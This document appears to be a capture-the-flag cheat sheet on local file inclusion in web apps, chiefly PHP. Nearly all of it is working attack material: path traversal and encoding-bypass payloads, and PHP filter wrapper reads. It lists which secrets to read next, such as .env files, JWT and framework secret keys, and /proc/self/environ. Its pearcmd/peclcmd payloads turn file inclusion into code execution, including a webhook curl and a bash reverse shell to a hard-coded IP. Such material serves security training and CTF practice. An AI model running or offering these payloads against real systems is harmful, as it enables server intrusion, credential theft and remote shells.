# LFI

## Fast Probes

```text
../../../../flag.txt
..././..././flag.txt
..%2f..%2f..%2fflag.txt
%252e%252e%252f%252e%252e%252fflag.txt
```

## Payload Bank

```text
/?file=/flag.txt
/?file=/etc/passwd
/?file=/proc/self/environ
/?file=/proc/self/cmdline
/?file=/app/.env
/?file=/var/www/html/.env
/?file=/var/log/nginx/access.log
/?file=php://filter/convert.base64-encode/resource=index.php
/?file=php://filter/convert.base64-encode/resource=/flag.txt
/?file=php://filter/zlib.deflate/convert.base64-encode/resource=/flag.txt
```

* Basic:\
  `/etc/passwd`, `../../../../etc/passwd`
* PHP Wrapper:\
  `?page=php://filter/convert.base64-encode/resource=index.php`

[https://hackmd.io/@LightSheng/ByrFtyaQp](https://hackmd.io/@LightSheng/ByrFtyaQp)<br>

## Check Php Gadget

```
# deploy local with docker compose

# after that on the terminal container

find -name "*.php"
```

## Bypass

```text
....//....//....//flag.txt
..././..././..././flag.txt
..%2f..%2f..%2fflag.txt
%252e%252e%252fetc%252fpasswd
..\..\..\flag.txt
/var/www/images/../../../etc/passwd
../../../etc/passwd%00.png
```

## Post-Read Priority

1. App source: routes, templates, middleware, validators.
2. Config: `.env`, `config.py`, `settings.py`, `application.yml`, `composer.json`.
3. Secrets: Flask/Django secret, JWT secret, Rails `secret_key_base`.
4. Runtime: `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/cwd`.
5. Writable targets: access logs, uploads, temp folders, session files.

```text
/?file=/app/app.py
/?file=/app/config.py
/?file=/app/package.json
/?file=/var/www/html/index.php
/?file=/var/www/html/composer.json
```

## LFI2RCE via pearcmd / peclcmd

Note:&#x20;

```url
?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd.ph&/<?=system(‘whoami’)?>+../../../../../tmp/sudo_von.ph

?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd.ph&/<?=system(‘curl WEBHOOK |’)?>+../../../../../tmp/sudo_von.php

?+config-create+/&file=.././.././.././.././../usr/local/lib/./php/peclcmd.php&/<?=system(base64_decode('Y2F0IC9mbGFnX25lX2hpaGkudHh0'));?>+/tmp/hello.php
```

With Base64

```
/?+config-create+/&eHh4eD4qKipQRDl3YUhBZ2MzbHpkR1Z0S0NSZlIwVlVXMk50WkYwcE96czdQejRn<&kaibro=/usr/local/lib/php/pearcmd&/<meow>+/tmp/meoww.php

/?kaibro=php%3a//filter/read=string.strip_tags%7Cconvert.base64-decode%7Cstring.strip_tags%7Cconvert.base64-decode/resource=/tmp/meoww&cmd=/readflag
```

Revshell

```
curl "http://localhost/usr/local/lib/php/peclcmd.php?+run-tests+-i+-r\"system(hex2bin('$(hex "bash -c 'sh -i >& /dev/tcp/108.137.37.157/4444 0>&1'")'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt"

```

## LFI2RCE via php filter chain

{% content-ref url="php.md" %}
[php.md](php.md)
{% endcontent-ref %}

## Links

Detailed lfi2rce

{% embed url="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html" %}

Adv payload, pearcmd

{% embed url="https://hackmd.io/@LightSheng/ByrFtyaQp" %}

Log poisoning, basics payload

{% embed url="https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet" %}
